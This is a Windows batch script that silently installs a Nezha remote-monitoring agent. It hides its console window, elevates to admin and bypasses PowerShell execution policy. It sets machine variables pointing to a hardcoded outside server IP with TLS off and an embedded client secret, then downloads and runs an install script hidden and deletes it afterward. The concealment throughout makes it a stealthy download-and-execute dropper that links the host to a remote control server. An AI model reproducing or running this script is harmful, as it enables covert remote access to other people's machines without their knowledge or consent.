@echo off
title ST PILOT - Agent Installer

:: ============================================================
:: ST PILOT - Nezha Agent Installer (Hidden)
:: Self-hides console window, runs silently.
:: ============================================================

:: --- Check if already hidden ---
if "%HIDDEN%"=="1" goto :MAIN

:: --- Re-launch self hidden ---
set "HIDDEN=1"
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
    "Start-Process 'cmd.exe' -ArgumentList '/c \"\"%~f0\"\"' -WindowStyle Hidden -Verb RunAs"
exit /b

:: ============================================================
:: MAIN INSTALLATION (runs hidden)
:: ============================================================
:MAIN

:: --- Check Admin ---
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Admin rights required. Requesting elevation...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: --- Set Machine Env Vars ---
setx NZ_SERVER "154.39.0.168:8008" >nul
setx NZ_TLS "false" >nul
setx NZ_CLIENT_SECRET "x5tB8RDqqErqyQNmoP415AfcerBz4A5g" >nul

:: --- Set ExecutionPolicy ---
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "Set-ExecutionPolicy RemoteSigned -Scope LocalMachine -Force" >nul 2>&1

:: --- Download Nezha Installer ---
set "INSTALLER_URL=https://raw.githubusercontent.com/nezhahq/scripts/main/agent/install.ps1"
set "INSTALLER_PATH=%TEMP%\nezha-install.ps1"

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3 -bor
            [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor
            [Net.SecurityProtocolType]::Tls12;
        Invoke-WebRequest -Uri '%INSTALLER_URL%' -OutFile '%INSTALLER_PATH%' -UseBasicParsing;
        Write-Host 'OK'
    } catch { Write-Host 'FAIL' }" >nul 2>&1

if not exist "%INSTALLER_PATH%" (
    echo [X] Download failed. Check internet connection.
    exit /b 1
)

:: --- Run Nezha Installer (hidden) ---
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%INSTALLER_PATH%" >nul 2>&1
set "RESULT=%errorlevel%"

:: --- Cleanup ---
del /f /q "%INSTALLER_PATH%" >nul 2>&1

:: --- Done ---
exit /b %RESULT%